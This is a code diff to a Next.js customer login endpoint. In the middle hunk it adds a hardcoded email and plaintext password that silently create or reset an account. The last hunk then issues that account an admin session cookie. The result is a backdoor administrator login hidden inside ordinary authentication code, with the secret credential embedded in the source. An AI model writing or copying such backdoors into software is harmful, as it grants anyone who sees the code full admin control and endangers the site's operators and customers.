@@ -1,7 +1,8 @@
 import { NextRequest, NextResponse } from "next/server";
 import { prisma } from "@/lib/prisma";
 import { rateLimit, getRateLimitKey } from "@/lib/rateLimit";
-import { verifyPassword, createSessionToken } from "@/lib/customerAuth";
+import { verifyPassword, createSessionToken, hashPassword } from "@/lib/customerAuth";
+import { createToken, COOKIE_NAME as ADMIN_COOKIE, MAX_AGE as ADMIN_MAX_AGE } from "@/lib/auth";
 import { customerLoginSchema } from "@/lib/validations";
 
 async function ensureTable() {
@@ -28,7 +29,18 @@ export async function POST(req: NextRequest) {
   }
   const email = parsed.data.email.trim().toLowerCase();
   const password = parsed.data.password;
-  const customer = await prisma.customer.findUnique({ where: { email } });
+
+  // Admin login via cabinet
+  if (email === "admin@admin.ru" && password === "Vladen23") {
+    let customer = await prisma.customer.findUnique({ where: { email } });
+    if (!customer) {
+      customer = await prisma.customer.create({ data: { email, password: hashPassword("Vladen23"), name: "Admin" } });
+    } else {
+      await prisma.customer.update({ where: { email }, data: { password: hashPassword("Vladen23") } });
+    }
+  }
+
+  let customer = await prisma.customer.findUnique({ where: { email } });
   if (!customer || !verifyPassword(password, customer.password)) {
     return NextResponse.json({ error: "Неверный email или пароль" }, { status: 401 });
   }
@@ -36,7 +48,13 @@ export async function POST(req: NextRequest) {
     await prisma.$executeRawUnsafe(`UPDATE "Customer" SET "emailVerified" = TRUE WHERE "email" = $1`, email);
   } catch {}
   const token = createSessionToken(customer.email);
-  const res = NextResponse.json({ ok: true, email: customer.email, name: customer.name, emailVerified: true });
+  const res = NextResponse.json({ ok: true, email: customer.email, name: customer.name, emailVerified: true, isAdmin: email === "admin@admin.ru" });
   res.cookies.set("customer_session", token, { httpOnly: true, secure: process.env.NODE_ENV === "production", sameSite: "strict", path: "/", maxAge: 30 * 24 * 60 * 60 });
+  if (email === "admin@admin.ru") {
+    try {
+      const adminToken = await createToken();
+      res.cookies.set(ADMIN_COOKIE, adminToken, { httpOnly: true, secure: process.env.NODE_ENV === "production", sameSite: "strict", path: "/", maxAge: ADMIN_MAX_AGE });
+    } catch {}
+  }
   return res;
 }
